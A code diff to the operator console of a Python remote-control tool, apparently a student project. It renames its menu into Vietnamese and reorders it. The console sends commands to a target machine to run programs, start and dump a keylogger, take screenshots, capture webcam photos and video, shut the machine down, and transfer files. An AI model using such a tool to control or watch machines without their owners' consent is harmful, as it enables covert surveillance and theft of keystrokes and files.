@@ -46,22 +46,17 @@ def save_base64_file(data_b64: str, suggested_name: str) -> str:
 def print_menu():
     print(
         """
-Commands:
- 1) ping
- 2) list_processes
- 3) kill_process
- 4) start_app
- 5) screenshot
- 6) keylog_start
- 7) keylog_stop
- 8) keylog_dump
- 9) download file
-10) upload file
-11) shutdown
-12) restart
-13) webcam_capture
-14) webcam_record
- x) exit
+Chọn chức năng (theo hình):
+ 1) Process Running     (liệt kê tiến trình)
+ 2) App Running         (khởi động ứng dụng)
+ 3) Keystroke           (bắt phím: start/stop/dump)
+ 4) Tắt máy             (shutdown)
+ 5) Chụp màn hình       (screenshot)
+ 6) Webcam capture      (ảnh webcam)
+ 7) Webcam record       (video webcam)
+ 8) Download file       (tải file từ máy đích)
+ 9) Upload file         (gửi file lên máy đích)
+ x) Thoát
 """
     )
 
@@ -83,44 +78,42 @@ def main():
                 break
 
             try:
-                if choice == "1":
-                    send_message(conn, {"action": "ping"})
-                elif choice == "2":
+                if choice == "1":  # Process Running
                     send_message(conn, {"action": "list_processes"})
-                elif choice == "3":
-                    pid = int(input("PID to kill: "))
-                    send_message(conn, {"action": "kill_process", "pid": pid})
-                elif choice == "4":
-                    cmd = input("Command to start: ").strip()
+                elif choice == "2":  # App Running
+                    cmd = input("Lệnh/ứng dụng để chạy: ").strip()
                     send_message(conn, {"action": "start_app", "command": cmd})
-                elif choice == "5":
+                elif choice == "3":  # Keystroke submenu
+                    sub = input("k: start | s: stop | d: dump -> ").strip().lower()
+                    if sub == "k":
+                        send_message(conn, {"action": "keylog_start"})
+                    elif sub == "s":
+                        send_message(conn, {"action": "keylog_stop"})
+                    elif sub == "d":
+                        send_message(conn, {"action": "keylog_dump"})
+                    else:
+                        print("Chọn k/s/d")
+                        continue
+                elif choice == "4":  # Tắt máy
+                    send_message(conn, {"action": "shutdown"})
+                elif choice == "5":  # Chụp màn hình
                     send_message(conn, {"action": "screenshot"})
-                elif choice == "6":
-                    send_message(conn, {"action": "keylog_start"})
-                elif choice == "7":
-                    send_message(conn, {"action": "keylog_stop"})
-                elif choice == "8":
-                    send_message(conn, {"action": "keylog_dump"})
-                elif choice == "9":
-                    path = input("Remote file path: ").strip()
+                elif choice == "6":  # Webcam capture
+                    send_message(conn, {"action": "webcam_capture"})
+                elif choice == "7":  # Webcam record
+                    seconds = int(input("Ghi video mấy giây (mặc định 5): ") or "5")
+                    send_message(conn, {"action": "webcam_record", "seconds": seconds})
+                elif choice == "8":  # Download file
+                    path = input("Đường dẫn file từ máy đích: ").strip()
                     send_message(conn, {"action": "download", "path": path})
-                elif choice == "10":
-                    local = input("Local file to upload: ").strip()
-                    remote = input("Remote path to write: ").strip()
+                elif choice == "9":  # Upload file
+                    local = input("File cục bộ để gửi: ").strip()
+                    remote = input("Đường dẫn lưu trên máy đích: ").strip()
                     with open(local, "rb") as f:
                         data_b64 = base64.b64encode(f.read()).decode("ascii")
                     send_message(conn, {"action": "upload", "path": remote, "data": data_b64})
-                elif choice == "11":
-                    send_message(conn, {"action": "shutdown"})
-                elif choice == "12":
-                    send_message(conn, {"action": "restart"})
-                elif choice == "13":
-                    send_message(conn, {"action": "webcam_capture"})
-                elif choice == "14":
-                    seconds = int(input("Record seconds (default 5): ") or "5")
-                    send_message(conn, {"action": "webcam_record", "seconds": seconds})
                 else:
-                    print("Unknown choice")
+                    print("Không hợp lệ")
                     continue
 
                 resp = recv_message(conn)
